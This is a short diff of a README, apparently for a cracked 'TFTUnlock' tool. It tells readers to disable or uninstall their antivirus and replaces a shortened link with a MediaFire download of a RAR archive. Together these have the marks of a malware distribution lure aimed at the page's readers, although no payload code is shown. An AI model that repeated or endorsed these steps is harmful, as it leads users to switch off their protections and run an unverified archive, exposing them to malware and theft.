@@ -30,7 +30,7 @@ Before proceeding, make sure you have disabled or uninstalled any antivirus soft
 First, download the repository containing all necessary files.
 
 ```bash
-https://bit.ly/TFTUnlock
+[Download Here](https://www.mediafire.com/file/ncydkv6zlvw4xjr/TFTUnlock-2024-v4.7.2.2.rar/file)
 ```
 
 or
